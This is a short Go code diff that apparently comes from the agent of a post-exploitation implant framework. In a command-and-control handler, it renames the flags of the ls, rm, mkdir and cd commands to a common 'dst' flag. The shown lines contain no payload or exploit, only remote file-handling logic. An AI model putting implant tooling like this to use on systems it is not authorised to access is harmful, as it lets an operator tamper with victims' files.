@@ -122,7 +122,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// ls current path
 	case "ls":
-		target_dir := flags.StringP("dir", "d", ".", "Directory to list")
+		target_dir := flags.StringP("dst", "d", ".", "Directory to list")
 		flags.Parse(cmdSlice[1:])
 		if flags.NArg() > 0 {
 			*target_dir = flags.Arg(0)
@@ -136,7 +136,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// remove file/dir
 	case "rm":
-		path := flags.StringP("path", "p", "", "Path to remove")
+		path := flags.StringP("dst", "d", "", "Path to remove")
 		flags.Parse(cmdSlice[1:])
 		if *path == "" {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
@@ -150,7 +150,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// mkdir
 	case "mkdir":
-		path := flags.StringP("path", "p", "", "Path to create")
+		path := flags.StringP("dst", "d", "", "Path to create")
 		flags.Parse(cmdSlice[1:])
 		if *path == "" {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
@@ -194,7 +194,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// change directory
 	case "cd":
-		path := flags.StringP("path", "p", "", "Path to change to")
+		path := flags.StringP("dst", "d", "", "Path to change to")
 		flags.Parse(cmdSlice[1:])
 		if *path == "" {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
